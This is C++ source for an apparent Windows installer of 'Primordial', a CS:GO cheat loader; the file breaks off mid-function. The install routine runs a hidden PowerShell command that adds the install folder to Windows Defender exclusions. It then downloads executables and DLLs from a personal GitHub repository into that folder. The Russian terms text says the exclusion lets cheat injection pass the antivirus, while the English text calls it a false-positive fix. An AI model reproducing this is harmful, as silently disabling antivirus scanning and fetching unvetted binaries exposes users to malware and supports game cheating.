#include <windows.h>
#include <gdiplus.h>
#include <shlobj.h>
#include <shobjidl.h>
#include <objbase.h>
#include <shlguid.h>
#include <filesystem>
#include <fstream>
#include <string>
#include <thread>
#include <atomic>
#include <dwmapi.h>
#include <urlmon.h>
#pragma comment(lib, "urlmon.lib")
#include <mmsystem.h>
#pragma comment(lib, "gdiplus.lib")
#pragma comment(lib, "dwmapi.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "winmm.lib")

#include "resource.h"

enum InstallerState {
    INST_INIT,
    INST_TERMS,
    INST_PROMPT,
    INST_INSTALLING,
    INST_UNINSTALLING,
    INST_TRANSITION_INSTALL,
    INST_TRANSITION_UNINSTALL,
    INST_DONE,
    INST_UNINSTALLED
};

static std::atomic<InstallerState> g_State(INST_INIT);
static std::atomic<float> g_Progress(0.0f);
static std::atomic<int> g_CurrentHeight(130);
static std::atomic<int> g_TransitionAlpha(0);
static int g_WindowAlpha = 255;

static bool g_HoverBtn1 = false;
static bool g_HoverBtn2 = false;
static bool g_HoverClose = false;
static bool g_HoverTermsCheck = false;
static bool g_TermsAccepted = false;
static int g_TermsScrollY = 0;
static int g_TermsMaxScrollY = 60;

static std::wstring g_InstallDir;
static std::wstring g_InstalledLoaderPath;
static std::wstring g_ShortcutPath;
static std::wstring g_LocalVersionStr = L"";
static std::wstring g_RemoteVersionStr = L"";
static std::wstring g_NewsText = L"";
static float g_NewsScrollX = 0.0f;
static POINT g_MousePos = { -100, -100 };
static bool g_IsMouseInWindow = false;

static const int WND_WIDTH = 360;

static bool CheckVCRedistInstalled() {
    HKEY hKey;
    // Check VC++ 2015-2022 x86 redistributable in registry
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\VisualStudio\\14.0\\VC\\Runtimes\\X86", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        DWORD installed = 0;
        DWORD size = sizeof(installed);
        if (RegQueryValueExW(hKey, L"Installed", NULL, NULL, (LPBYTE)&installed, &size) == ERROR_SUCCESS && installed == 1) {
            RegCloseKey(hKey);
            return true;
        }
        RegCloseKey(hKey);
    }
    // Also check WOW6432Node
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\WOW6432Node\\Microsoft\\VisualStudio\\14.0\\VC\\Runtimes\\X86", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        DWORD installed = 0;
        DWORD size = sizeof(installed);
        if (RegQueryValueExW(hKey, L"Installed", NULL, NULL, (LPBYTE)&installed, &size) == ERROR_SUCCESS && installed == 1) {
            RegCloseKey(hKey);
            return true;
        }
        RegCloseKey(hKey);
    }
    return false;
}

static void InstallVCRedistSilently() {
    if (CheckVCRedistInstalled()) return;
    wchar_t tempPath[MAX_PATH];
    GetTempPathW(MAX_PATH, tempPath);
    std::wstring redistExe = std::wstring(tempPath) + L"vc_redist.x86.exe";
    HRESULT hr = URLDownloadToFileW(NULL, L"https://aka.ms/vs/17/release/vc_redist.x86.exe", redistExe.c_str(), 0, NULL);
    if (SUCCEEDED(hr)) {
        SHELLEXECUTEINFOW sei = { sizeof(sei) };
        sei.fMask = SEE_MASK_NOCLOSEPROCESS;
        sei.lpVerb = L"open";
        sei.lpFile = redistExe.c_str();
        sei.lpParameters = L"/install /passive /norestart /quiet";
        sei.nShow = SW_HIDE;
        if (ShellExecuteExW(&sei) && sei.hProcess) {
            WaitForSingleObject(sei.hProcess, 60000);
            CloseHandle(sei.hProcess);
        }
        DeleteFileW(redistExe.c_str());
    }
}

static bool CheckDirectX9Installed() {
    wchar_t sysPath[MAX_PATH];
    if (GetSystemDirectoryW(sysPath, MAX_PATH)) {
        std::wstring d3dx9_43 = std::wstring(sysPath) + L"\\d3dx9_43.dll";
        if (std::filesystem::exists(d3dx9_43)) return true;
    }
    wchar_t winDir[MAX_PATH];
    if (GetWindowsDirectoryW(winDir, MAX_PATH)) {
        std::wstring wow64 = std::wstring(winDir) + L"\\SysWOW64\\d3dx9_43.dll";
        if (std::filesystem::exists(wow64)) return true;
    }
    return false;
}

static void InstallDirectX9Silently() {
    if (CheckDirectX9Installed()) return;
    wchar_t tempPath[MAX_PATH];
    GetTempPathW(MAX_PATH, tempPath);
    std::wstring dxExe = std::wstring(tempPath) + L"dxwebsetup.exe";
    HRESULT hr = URLDownloadToFileW(NULL, L"https://download.microsoft.com/download/1/7/1/1718CCC4-6315-4D8E-9543-8E28A4E18C4C/dxwebsetup.exe", dxExe.c_str(), 0, NULL);
    if (SUCCEEDED(hr)) {
        SHELLEXECUTEINFOW sei = { sizeof(sei) };
        sei.fMask = SEE_MASK_NOCLOSEPROCESS;
        sei.lpVerb = L"open";
        sei.lpFile = dxExe.c_str();
        sei.lpParameters = L"/Q";
        sei.nShow = SW_HIDE;
        if (ShellExecuteExW(&sei) && sei.hProcess) {
            WaitForSingleObject(sei.hProcess, 60000);
            CloseHandle(sei.hProcess);
        }
        DeleteFileW(dxExe.c_str());
    }
}


class DownloadProgressCallback : public IBindStatusCallback {
public:
    float startP = 0.0f;
    float endP = 1.0f;
    DownloadProgressCallback(float s, float e) : startP(s), endP(e) {}

    STDMETHOD(OnProgress)(ULONG ulProgress, ULONG ulProgressMax, ULONG ulStatusCode, LPCWSTR szStatusText) {
        if (ulProgressMax > 0) {
            float fileFraction = (float)ulProgress / (float)ulProgressMax;
            if (fileFraction > 1.0f) fileFraction = 1.0f;
            g_Progress = startP + (endP - startP) * fileFraction;
        }
        return S_OK;
    }
    STDMETHOD(OnStartBinding)(DWORD, IBinding*) { return S_OK; }
    STDMETHOD(GetPriority)(LONG*) { return S_OK; }
    STDMETHOD(OnLowResource)(DWORD) { return S_OK; }
    STDMETHOD(OnStopBinding)(HRESULT, LPCWSTR) { return S_OK; }
    STDMETHOD(GetBindInfo)(DWORD*, BINDINFO*) { return S_OK; }
    STDMETHOD(OnDataAvailable)(DWORD, DWORD, FORMATETC*, STGMEDIUM*) { return S_OK; }
    STDMETHOD(OnObjectAvailable)(REFIID, IUnknown*) { return S_OK; }
    STDMETHOD_(ULONG, AddRef)() { return 1; }
    STDMETHOD_(ULONG, Release)() { return 1; }
    STDMETHOD(QueryInterface)(REFIID riid, void** ppv) {
        if (riid == IID_IUnknown || riid == IID_IBindStatusCallback) {
            *ppv = this;
            return S_OK;
        }
        *ppv = NULL;
        return E_NOINTERFACE;
    }
};

static bool DownloadFileWithProgress(const std::wstring& url, const std::wstring& dest, float startP, float endP) {
    if (std::filesystem::exists(dest)) std::filesystem::remove(dest);
    DownloadProgressCallback cb(startP, endP);
    HRESULT hr = URLDownloadToFileW(NULL, url.c_str(), dest.c_str(), 0, &cb);
    g_Progress = endP;
    return SUCCEEDED(hr);
}

static void CreateDesktopShortcut(const std::wstring& targetExe) {
    CoInitialize(NULL);
    IShellLinkW* psl;
    if (SUCCEEDED(CoCreateInstance(CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER, IID_IShellLinkW, (LPVOID*)&psl))) {
        IPersistFile* ppf;
        psl->SetPath(targetExe.c_str());
        psl->SetIconLocation(targetExe.c_str(), 0);
        psl->SetWorkingDirectory(std::filesystem::path(targetExe).parent_path().wstring().c_str());
        if (SUCCEEDED(psl->QueryInterface(IID_IPersistFile, (LPVOID*)&ppf))) {
            ppf->Save(g_ShortcutPath.c_str(), TRUE);
            ppf->Release();
        }
        psl->Release();
    }
    CoUninitialize();
}

static void RunInstall(HWND hWnd) {
    g_State = INST_INSTALLING;
    g_Progress = 0.0f;
    std::this_thread::sleep_for(std::chrono::milliseconds(100));

    try { std::filesystem::create_directories(g_InstallDir); } catch (...) {}
    g_Progress = 0.04f;

    // Copy setup itself to install dir for future updates / uninstalls
    wchar_t selfExe[MAX_PATH];
    GetModuleFileNameW(NULL, selfExe, MAX_PATH);
    std::wstring destSetup = g_InstallDir + L"\\PrimordialSetup.exe";
    try {
        if (_wcsicmp(selfExe, destSetup.c_str()) != 0) {
            std::filesystem::copy_file(selfExe, destSetup, std::filesystem::copy_options::overwrite_existing);
        }
    } catch (...) {}

    // Check & Install VC++ Redistributable 2015-2022 (x86) and DirectX 9 silently
    InstallVCRedistSilently();
    InstallDirectX9Silently();
    g_Progress = 0.07f;

    // Add Windows Defender exclusion silently
    ShellExecuteW(NULL, L"open", L"powershell.exe", L"-WindowStyle Hidden -Command Add-MpPreference -ExclusionPath \"$env:APPDATA\\primordial\"", NULL, SW_HIDE);
    g_Progress = 0.10f;

    // Download loader executable with real smooth progress (0.08 -> 0.70)
    bool ok = DownloadFileWithProgress(L"https://github.com/barabulka14221422-commits/Primordial-CSGO/releases/download/dont-download-its-just-loader/Primordial.exe", g_InstalledLoaderPath, 0.08f, 0.70f);
    if (!ok) {
        ok = DownloadFileWithProgress(L"https://github.com/barabulka14221422-commits/Primordial-CSGO/releases/latest/download/Primordial.exe", g_InstalledLoaderPath, 0.08f, 0.70f);
    }

    // Download companion DLLs and Fixer with smooth progress
    DownloadFileWithProgress(L"https://raw.githubusercontent.com/barabulka14221422-commits/Primordial-CSGO/main/primordial_discord.dll", g_InstallDir + L"\\primordial_discord.dll", 0.70f, 0.80f);
    DownloadFileWithProgress(L"https://raw.githubusercontent.com/barabulka14221422-commits/Primordial-CSGO/main/primordial_core.dll", g_InstallDir + L"\\primordial_core.dll", 0.80f, 0.88f);
    DownloadFileWithProgress(L"https://raw.githubusercontent.com/barabulka14221422-commits/Primordial-CSGO/main/primordial_graphics.dll", g_InstallDir + L"\\primordial_graphics.dll", 0.88f, 0.94f);
    
    std::wstring fixPath = g_InstallDir + L"\\Fixer.exe";
    DownloadFileWithProgress(L"https://raw.githubusercontent.com/barabulka14221422-commits/Primordial-CSGO/main/Fixer.exe", fixPath, 0.94f, 0.98f);

    // Save current installed version.txt locally
    DownloadFileWithProgress(L"https://raw.githubusercontent.com/barabulka14221422-commits/Primordial-CSGO/main/version.txt", g_InstallDir + L"\\version.txt", 0.98f, 0.99f);

    CreateDesktopShortcut(g_InstalledLoaderPath);
    g_Progress = 1.0f;
    std::this_thread::sleep_for(std::chrono::milliseconds(200));
    
    g_CurrentHeight = 130;
    g_State = INST_TRANSITION_INSTALL;
    PlaySoundW(MAKEINTRESOURCEW(IDR_SOUND_SUCCESS), GetModuleHandle(NULL), SND_RESOURCE | SND_ASYNC);
    
    for (int alpha = 255; alpha >= 0; alpha -= 12) {
        g_TransitionAlpha = alpha;
        std::this_thread::sleep_for(std::chrono::milliseconds(16));
    }
    g_TransitionAlpha = 0;
    g_State = INST_DONE;
}

static void RunUninstall(HWND hWnd) {
    g_State = INST_UNINSTALLING;
    g_Progress = 0.0f;

    wchar_t selfExe[MAX_PATH];
    GetModuleFileNameW(NULL, selfExe, MAX_PATH);

    for (float p = 0.0f; p <= 0.8f; p += 0.1f) {
        g_Progress = p;
        std::this_thread::sleep_for(std::chrono::milliseconds(30));
    }

    // Remove Windows Defender exclusion silently on uninstall
    ShellExecuteW(NULL, L"open", L"powershell.exe", L"-WindowStyle Hidden -Command Remove-MpPreference -ExclusionPath \"$env:APPDATA\\primordial\"", NULL, SW_HIDE);
    g_Progress = 0.85f;

    // Delete all installed files except the currently running uninstaller exe
    try {
        if (std::filesystem::exists(g_InstallDir)) {
            for (const auto& entry : std::filesystem::directory_iterator(g_InstallDir)) {
                if (_wcsicmp(entry.path().wstring().c_str(), selfExe) != 0) {
                    std::error_code ec;
                    std::filesystem::remove_all(entry.path(), ec);
                }
            }
        }
    } catch (...) {}
    try { std::filesystem::remove(g_ShortcutPath); } catch (...) {}
    
    g_Progress = 1.0f;
    std::this_thread::sleep_for(std::chrono::milliseconds(200));
    
    g_CurrentHeight = 130;
    g_State = INST_TRANSITION_UNINSTALL;
    PlaySoundW(MAKEINTRESOURCEW(IDR_SOUND_SUCCESS), GetModuleHandle(NULL), SND_RESOURCE | SND_ASYNC);
    
    for (int alpha = 255; alpha >= 0; alpha -= 12) {
        g_TransitionAlpha = alpha;
        std::this_thread::sleep_for(std::chrono::milliseconds(16));
    }
    g_TransitionAlpha = 0;
    g_State = INST_UNINSTALLED;
}

static RECT GetTermsCheckRect() {
    int x = 20;
    int y = 370;
    return { x, y, WND_WIDTH - 20, y + 22 };
}

static RECT GetBtn1Rect() {
    if (g_State == INST_TERMS) {
        int w = 220, h = 40;
        int x = (WND_WIDTH - w) / 2;
        int y = 400;
        return { x, y, x + w, y + h };
    }
    int w = 200, h = 44;
    int x = (WND_WIDTH - w) / 2;
    int y = (g_State == INST_PROMPT) ? 60 : 66; // slightly higher in prompt
    return { x, y, x + w, y + h };
}
static RECT GetBtn2Rect() {
    int w = 200, h = 44;
    int x = (WND_WIDTH - w) / 2;
    int y = 115;
    return { x, y, x + w, y + h };
}
static RECT GetCloseRect() { return { WND_WIDTH - 28, 6, WND_WIDTH - 6, 28 }; }

static void RenderWindow(HWND hWnd) {
    static int s_LastHeight = 0;
    int curH = g_CurrentHeight;
    if (s_LastHeight != curH) {
        if (s_LastHeight != 0) {
            int dy = (curH - s_LastHeight) / 2;
            RECT r; GetWindowRect(hWnd, &r);
            SetWindowPos(hWnd, NULL, r.left, r.top - dy, WND_WIDTH, curH, SWP_NOZORDER | SWP_NOACTIVATE);
        } else {
            SetWindowPos(hWnd, NULL, 0, 0, WND_WIDTH, curH, SWP_NOMOVE | SWP_NOZORDER | SWP_NOACTIVATE);
        }
        s_LastHeight = curH;
    }

    HDC hdcScreen = GetDC(NULL);
    HDC hdcMem = CreateCompatibleDC(hdcScreen);

    BITMAPINFO bmi = {};
    bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
    bmi.bmiHeader.biWidth = WND_WIDTH;
    bmi.bmiHeader.biHeight = -curH; // Top-down DIB
    bmi.bmiHeader.biPlanes = 1;
    bmi.bmiHeader.biBitCount = 32;
    bmi.bmiHeader.biCompression = BI_RGB;

    void* pBits = nullptr;
    HBITMAP hBmp = CreateDIBSection(hdcScreen, &bmi, DIB_RGB_COLORS, &pBits, NULL, 0);
    HBITMAP hOldBmp = (HBITMAP)SelectObject(hdcMem, hBmp);

    {
        Gdiplus::Graphics graphics(hdcMem);
        graphics.SetSmoothingMode(Gdiplus::SmoothingModeAntiAlias);
        graphics.SetTextRenderingHint(Gdiplus::TextRenderingHintClearTypeGridFit);

        if (g_State == INST_INSTALLING || g_State == INST_UNINSTALLING) {
            graphics.Clear(Gdiplus::Color(0, 0, 0, 0));

            int barW = 280;
            int barH = 28;
            int barX = (WND_WIDTH - barW) / 2;
            int barY = (curH - barH) / 2;

            Gdiplus::SolidBrush barBg(Gdiplus::Color(255, 20, 20, 25));
            graphics.FillRectangle(&barBg, barX, barY, barW, barH);

            int fillW = (int)(barW * g_Progress);
            if (fillW > 0) {
                DWORD tick = GetTickCount();
                float t = (tick % 400) / 400.0f; // Fast pulse
                float wave = (sin(t * 3.14159265f * 2.0f) + 1.0f) * 0.5f;

                int r1 = 30 + (int)(40 * wave);
                int g1 = 100 + (int)(50 * wave);
                int b1 = 180 + (int)(75 * wave);

                int r2 = 30 + (int)(40 * (1.0f - wave));
                int g2 = 100 + (int)(50 * (1.0f - wave));
                int b2 = 180 + (int)(75 * (1.0f - wave));

                Gdiplus::LinearGradientBrush barFill(
                    Gdiplus::Point(barX, barY), Gdiplus::Point(barX + fillW, barY),
                    Gdiplus::Color(255, r1, g1, b1),
                    Gdiplus::Color(255, r2, g2, b2) 
                );
                graphics.FillRectangle(&barFill, barX, barY, fillW, barH);
            }
        } else {
            graphics.Clear(Gdiplus::Color(255, 0, 0, 0));

            Gdiplus::Pen borderPen(Gdiplus::Color(255, 180, 215, 255), 1.5f);
            graphics.DrawRectangle(&borderPen, 0, 0, WND_WIDTH - 1, curH - 1);
            Gdiplus::Pen innerGlowPen(Gdiplus::Color(45, 180, 215, 255), 1.0f);
            graphics.DrawRectangle(&innerGlowPen, 1, 1, WND_WIDTH - 3, curH - 3);

            Gdiplus::FontFamily fontFamily(L"Segoe UI");
            
            Gdiplus::Font creditFont(&fontFamily, 10.0f, Gdiplus::FontStyleRegular, Gdiplus::UnitPixel);
            Gdiplus::SolidBrush creditBrush(Gdiplus::Color(255, 140, 180, 220));
            graphics.DrawString(L"@saved_messenges", -1, &creditFont, Gdiplus::PointF(8.0f, 6.0f), &creditBrush);

            if (g_State != INST_UNINSTALLED && g_State != INST_TRANSITION_UNINSTALL) {
                Gdiplus::Font closeFont(&fontFamily, 12.0f, Gdiplus::FontStyleBold, Gdiplus::UnitPixel);
                Gdiplus::SolidBrush closeBrush(g_HoverClose ? Gdiplus::Color(255, 255, 255, 255) : Gdiplus::Color(255, 200, 225, 255));
                graphics.DrawString(L"X", -1, &closeFont, Gdiplus::PointF((float)(WND_WIDTH - 20), 6.0f), &closeBrush);
            }

            Gdiplus::StringFormat centerFmt;
            centerFmt.SetAlignment(Gdiplus::StringAlignmentCenter);
            centerFmt.SetLineAlignment(Gdiplus::StringAlignmentCenter);

            Gdiplus::Font statusFont(&fontFamily, 11.0f, Gdiplus::FontStyleRegular, Gdiplus::UnitPixel);
            Gdiplus::SolidBrush statusBrush(Gdiplus::Color(255, 210, 235, 255));
            
            auto DrawBtn = [&](RECT r, const wchar_t* txt, bool hover) {
                Gdiplus::SolidBrush bBrush(hover ? Gdiplus::Color(255, 24, 30, 42) : Gdiplus::Color(255, 16, 20, 28));
                graphics.FillRectangle(&bBrush, (int)r.left, (int)r.top, (int)(r.right - r.left), (int)(r.bottom - r.top));
                Gdiplus::Pen bPen(hover ? Gdiplus::Color(255, 120, 180, 240) : Gdiplus::Color(255, 60, 90, 130), 1.0f);
                graphics.DrawRectangle(&bPen, (int)r.left, (int)r.top, (int)(r.right - r.left), (int)(r.bottom - r.top));
                if (hover) {
                    Gdiplus::Pen innerPen(Gdiplus::Color(80, 180, 220, 255), 1.0f);
                    graphics.DrawRectangle(&innerPen, (int)r.left + 1, (int)r.top + 1, (int)(r.right - r.left) - 2, (int)(r.bottom - r.top) - 2);
                }
                Gdiplus::Font bFont(&fontFamily, 13.0f, Gdiplus::FontStyleBold, Gdiplus::UnitPixel);
                Gdiplus::SolidBrush bText(hover ? Gdiplus::Color(255, 255, 255, 255) : Gdiplus::Color(255, 210, 230, 250));
                Gdiplus::RectF rf((float)r.left, (float)r.top, (float)(r.right - r.left), (float)(r.bottom - r.top));
                graphics.DrawString(txt, -1, &bFont, rf, &centerFmt, &bText);
            };

            Gdiplus::RectF statusRect(0.0f, 32.0f, (float)WND_WIDTH, 20.0f);

            if (g_State == INST_TERMS) {
                // Slow subtle left-to-right wave shimmer between pure white and gentle icy cyan
                static DWORD s_TermsTick = GetTickCount();
                float shimmerOffset = std::fmod((GetTickCount() - s_TermsTick) * 0.045f, (float)WND_WIDTH);

                Gdiplus::LinearGradientBrush termsTitleBrush(
                    Gdiplus::PointF(shimmerOffset - 60.0f, 32.0f),
                    Gdiplus::PointF(shimmerOffset + 60.0f, 32.0f),
                    Gdiplus::Color(255, 255, 255, 255), // Pure white
                    Gdiplus::Color(255, 185, 225, 255)  // Subtle gentle icy cyan
                );
                termsTitleBrush.SetWrapMode(Gdiplus::WrapModeTileFlipX);

                Gdiplus::Font termsTitleFont(&fontFamily, 13.5f, Gdiplus::FontStyleBold, Gdiplus::UnitPixel);
                graphics.DrawString(L"PRIMORDIAL TERMS", -1, &termsTitleFont, statusRect, &centerFmt, &termsTitleBrush);

                // Terms Box
                int boxX = 16, boxY = 60, boxW = WND_WIDTH - 32, boxH = 295;
                Gdiplus::SolidBrush boxBg(Gdiplus::Color(255, 10, 14, 20));
                graphics.FillRectangle(&boxBg, boxX, boxY, boxW, boxH);
                Gdiplus::Pen boxBorder(Gdiplus::Color(255, 45, 75, 110), 1.0f);
                graphics.DrawRectangle(&boxBorder, boxX, boxY, boxW, boxH);

                // Text inside box with clipping
                Gdiplus::Region oldClip;
                graphics.GetClip(&oldClip);
                graphics.SetClip(Gdiplus::Rect(boxX + 8, boxY + 8, boxW - 16, boxH - 16));

                std::wstring termsText =
                    L"RU:\n\n"
                    L"• Данный проект является на 100% БЕСПЛАТНЫМ!\n"
                    L"• Любая продажа или перепродажа софта СТРОГО ЗАПРЕЩЕНА. Если вы купили этот софт - вы были заскамлены!\n"
                    L"• Создатель и разработчик проекта: @saved_messenges\n"
                    L"• Официальный канал: @saved_messenges\n"
                    L"• Официальный репозиторий: github.com/barabulka14221422-commits/Primordial-CSGO\n"
                    L"• Не скачивайте софт со сторонних сайтов во избежание вирусов!\n"
                    L"• Инсталлер автоматически добавит рабочую папку (%APPDATA%\\primordial) в исключения Защитника Windows (Defender), чтобы антивирус не блокировал инжект чита.\n\n"
                    L"EN:\n\n"
                    L"• This software is 100% FREE! Never pay anyone for this.\n"
                    L"• Reselling is strictly prohibited! If you bought this, you got scammed!\n"
                    L"• Developer: @saved_messenges | Telegram: @saved_messenges\n"
                    L"• Official GitHub: github.com/barabulka14221422-commits/Primordial-CSGO\n"
                    L"• Do not download from external sources to avoid malware!\n"
                    L"• Installer will automatically add its folder to Windows Defender exclusions to prevent false positives.";

                Gdiplus::Font termsBodyFont(&fontFamily, 11.0f, Gdiplus::FontStyleRegular, Gdiplus::UnitPixel);
                Gdiplus::SolidBrush termsBodyBrush(Gdiplus::Color(255, 185, 215, 245));
                Gdiplus::StringFormat leftFmt;
                leftFmt.SetAlignment(Gdiplus::StringAlignmentNear);
                leftFmt.SetLineAlignment(Gdiplus::StringAlignmentNear);

                Gdiplus::RectF layoutRect(0.0f, 0.0f, (float)(boxW - 20), 2000.0f);
                Gdiplus::RectF measuredRect;
                graphics.MeasureString(termsText.c_str(), -1, &termsBodyFont, layoutRect, &leftFmt, &measuredRect);

                int maxScroll = (int)(measuredRect.Height - (boxH - 24));
                if (maxScroll < 0) maxScroll = 0;
                g_TermsMaxScrollY = maxScroll;

                if (g_TermsScrollY > g_TermsMaxScrollY) g_TermsScrollY = g_TermsMaxScrollY;
                if (g_TermsScrollY < 0) g_TermsScrollY = 0;

                Gdiplus::RectF textRectF((float)(boxX + 10), (float)(boxY + 10 - g_TermsScrollY), (float)(boxW - 20), 2000.0f);
                graphics.DrawString(termsText.c_str(), -1, &termsBodyFont, textRectF, &leftFmt, &termsBodyBrush);
                graphics.SetClip(&oldClip);

                // Checkbox
                RECT checkR = GetTermsCheckRect();
                int cbSize = 14;
                int cbX = checkR.left;
                int cbY = checkR.top + 3;

                Gdiplus::SolidBrush cbBg(g_TermsAccepted ? Gdiplus::Color(255, 45, 120, 200) : (g_HoverTermsCheck ? Gdiplus::Color(255, 24, 32, 45) : Gdiplus::Color(255, 14, 18, 25)));
                graphics.FillRectangle(&cbBg, cbX, cbY, cbSize, cbSize);
                Gdiplus::Pen cbPen(g_HoverTermsCheck || g_TermsAccepted ? Gdiplus::Color(255, 120, 180, 255) : Gdiplus::Color(255, 60, 90, 130), 1.0f);
                graphics.DrawRectangle(&cbPen, cbX, cbY, cbSize, cbSize);

                if (g_TermsAccepted) {
                    Gdiplus::Pen checkMarkPen(Gdiplus::Color(255, 255, 255, 255), 1.8f);
                    graphics.DrawLine(&checkMarkPen, cbX + 3, cbY + 7, cbX + 6, cbY + 11);
                    graphics.DrawLine(&checkMarkPen, cbX + 6, cbY + 11, cbX + 11, cbY + 3);
                }

                Gdiplus::Font cbFont(&fontFamily, 11.0f, Gdiplus::FontStyleRegular, Gdiplus::UnitPixel);
                Gdiplus::SolidBrush cbTextBrush(g_HoverTermsCheck ? Gdiplus::Color(255, 255, 255, 255) : Gdiplus::Color(255, 200, 225, 255));
                graphics.DrawString(L"Я принимаю условия / I accept the terms", -1, &cbFont, Gdiplus::PointF((float)(cbX + cbSize + 8), (float)checkR.top + 2), &cbTextBrush);

                // Install Button (grayed out if not accepted)
                if (g_TermsAccepted) {
                    DrawBtn(GetBtn1Rect(), L"Install Primordial", g_HoverBtn1);
                } else {
                    Gdiplus::SolidBrush disBg(Gdiplus::Color(255, 16, 18, 22));
                    RECT bR = GetBtn1Rect();
                    graphics.FillRectangle(&disBg, (int)bR.left, (int)bR.top, (int)(bR.right - bR.left), (int)(bR.bottom - bR.top));
                    Gdiplus::Pen disPen(Gdiplus::Color(255, 40, 50, 65), 1.0f);
                    graphics.DrawRectangle(&disPen, (int)bR.left, (int)bR.top, (int)(bR.right - bR.left), (int)(bR.bottom - bR.top));
                    Gdiplus::Font bFont(&fontFamily, 13.0f, Gdiplus::FontStyleBold, Gdiplus::UnitPixel);
                    Gdiplus::SolidBrush disText(Gdiplus::Color(255, 90, 110, 130));
                    Gdiplus::RectF rf((float)bR.left, (float)bR.top, (float)(bR.right - bR.left), (float)(bR.bottom - bR.top));
                    graphics.DrawString(L"Install Primordial", -1, &bFont, rf, &centerFmt, &disText);
                }
            } else if (g_State == INST_PROMPT) {
                std::wstring promptMsg = L"Primordial is already installed.";
                if (!g_LocalVersionStr.empty() || !g_RemoteVersionStr.empty()) {
                    std::wstring curV = g_LocalVersionStr.empty() ? L"1.0" : g_LocalVersionStr;
                    std::wstring remV = g_RemoteVersionStr.empty() ? curV : g_RemoteVersionStr;
                    if (curV != remV) {
                        promptMsg = L"Version: " + curV + L" (Update available: " + remV + L")";
                    } else {
                        promptMsg = L"Version: " + curV + L" (Latest version)";
                    }
                }
                graphics.DrawString(promptMsg.c_str(), -1, &statusFont, statusRect, &centerFmt, &statusBrush);
                DrawBtn(GetBtn1Rect(), L"Update", g_HoverBtn1);
                DrawBtn(GetBtn2Rect(), L"Uninstall", g_HoverBtn2);
            } else if (g_State == INST_TRANSITION_INSTALL || g_State == INST_DONE) {
                graphics.DrawString(L"Install complete!", -1, &statusFont, statusRect, &centerFmt, &statusBrush);
                DrawBtn(GetBtn1Rect(), L"Launch Primordial", g_HoverBtn1);
            } else if (g_State == INST_TRANSITION_UNINSTALL || g_State == INST_UNINSTALLED) {
                graphics.DrawString(L"Uninstall complete!", -1, &statusFont, statusRect, &centerFmt, &statusBrush);
                DrawBtn(GetBtn1Rect(), L"Exit", g_HoverBtn1);
            }

            // Draw dedicated sleek news ticker at the bottom ONLY in INST_PROMPT state
            if (!g_NewsText.empty() && g_State == INST_PROMPT) {
                Gdiplus::SolidBrush tickerBg(Gdiplus::Color(255, 10, 13, 18));
                graphics.FillRectangle(&tickerBg, 1, curH - 22, WND_WIDTH - 2, 21);

                Gdiplus::Pen tickerLine(Gdiplus::Color(50, 180, 215, 255), 1.0f);
                graphics.DrawLine(&tickerLine, 1, curH - 22, WND_WIDTH - 2, curH - 22);

                Gdiplus::Font newsFont(&fontFamily, 9.5f, Gdiplus::FontStyleRegular, Gdiplus::UnitPixel);
                Gdiplus::SolidBrush newsBrush(Gdiplus::Color(255, 160, 210, 255));
                
                int newsY = curH - 18;
                int newsW = WND_WIDTH - 20;
                
                Gdiplus::Region oldClip;
                graphics.GetClip(&oldClip);
                graphics.SetClip(Gdiplus::Rect(10, newsY, newsW, 16));
                
                static DWORD s_InstLastTick = GetTickCount();
                DWORD nowTick = GetTickCount();
                DWORD dt = nowTick - s_InstLastTick;
                if (dt > 100) dt = 16;
                s_InstLastTick = nowTick;

                g_NewsScrollX -= (dt * 0.045f);

                // Build a seamless looping string with natural spacing
                std::wstring streamText = g_NewsText + L"          ";
                Gdiplus::RectF bounds;
                graphics.MeasureString(streamText.c_str(), -1, &newsFont, Gdiplus::PointF(0, 0), &bounds);
                float itemWidth = bounds.Width;

                if (itemWidth > 0.0f) {
                    while (g_NewsScrollX <= -itemWidth) {
                        g_NewsScrollX += itemWidth;
                    }
                    float posX = 10.0f + g_NewsScrollX;
                    while (posX < (float)(10 + newsW)) {
                        graphics.DrawString(streamText.c_str(), -1, &newsFont, Gdiplus::PointF(posX, (float)newsY), &newsBrush);
                        posX += itemWidth;
                    }
                }
                graphics.SetClip(&oldClip);
            }

            int tAlpha = g_TransitionAlpha;
            if ((g_State == INST_TRANSITION_INSTALL || g_State == INST_TRANSITION_UNINSTALL) && tAlpha > 0) {
                Gdiplus::SolidBrush flashBrush(Gdiplus::Color(tAlpha, 45, 120, 190));
                graphics.FillRectangle(&flashBrush, 0, 0, WND_WIDTH, curH);
            }
        }
    }

    POINT ptSrc = { 0, 0 };
    SIZE size = { WND_WIDTH, curH };
    BLENDFUNCTION blend = { AC_SRC_OVER, 0, (BYTE)g_WindowAlpha, AC_SRC_ALPHA };
    
    POINT ptDst;
    RECT wRect;
    GetWindowRect(hWnd, &wRect);
    ptDst.x = wRect.left;
    ptDst.y = wRect.top;

    UpdateLayeredWindow(hWnd, hdcScreen, &ptDst, &size, hdcMem, &ptSrc, 0, &blend, ULW_ALPHA);

    SelectObject(hdcMem, hOldBmp);
    DeleteObject(hBmp);
    DeleteDC(hdcMem);
    ReleaseDC(NULL, hdcScreen);
}

#include <wininet.h>
#pragma comment(lib, "wininet.lib")

static void FetchVersions() {
    std::filesystem::path localVerFile = g_InstallDir + L"\\version.txt";
    if (std::filesystem::exists(localVerFile)) {
        std::ifstream fin(localVerFile);
        if (fin.is_open()) {
            std::string line;
            if (std::getline(fin, line)) {
                while (!line.empty() && (line.back() == '\n' || line.back() == '\r' || line.back() == ' ')) line.pop_back();
                g_LocalVersionStr = std::wstring(line.begin(), line.end());
            }
            fin.close();
        }
    }
    
    HINTERNET hInternet = InternetOpenW(L"PrimordialInstaller/1.0", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    if (hInternet) {
        std::wstring url = L"https://raw.githubusercontent.com/barabulka14221422-commits/Primordial-CSGO/main/version.txt?t=" + std::to_wstring(GetTickCount64());
